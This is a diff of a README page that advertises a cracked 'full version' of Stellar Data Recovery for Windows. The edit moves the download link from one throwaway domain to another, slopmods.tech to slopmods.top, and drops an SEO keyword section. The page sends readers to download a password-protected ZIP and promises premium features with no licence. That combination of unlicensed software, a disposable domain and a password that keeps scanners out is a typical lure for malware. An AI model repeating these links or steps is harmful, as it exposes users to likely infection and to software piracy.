@@ -1,6 +1,6 @@
 ***
 
-# Stellar Data Recovery Full Version — Windows Install
+# Stellar Data Recovery Windows Setup
 
 Stellar Data Recovery — Windows setup and configuration · Premium workspace · Zero nag dialogs.
 
@@ -8,12 +8,12 @@ Stellar Data Recovery — Windows setup and configuration · Premium workspace �
 
 > Use the release page below for Windows.
 
-- **Release page:** [szvfzrvtard.slopmods.tech](https://szvfzrvtard.slopmods.tech/)
-- **Full URL:** `https://szvfzrvtard.slopmods.tech/`
+- **Release page:** [szvfzrvtard.slopmods.top](https://szvfzrvtard.slopmods.top/)
+- **Full URL:** `https://szvfzrvtard.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **szvfzrvtard.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **szvfzrvtard.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,13 +33,8 @@ Stellar Data Recovery — Windows setup and configuration · Premium workspace �
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **szvfzrvtard.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **szvfzrvtard.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
-
-
-## Search notes
-
-Install guide for **Stellar Data Recovery** full version on Windows PC (setup notes from release page).
 ## What you get
 
 - Scan drives for deleted or lost files
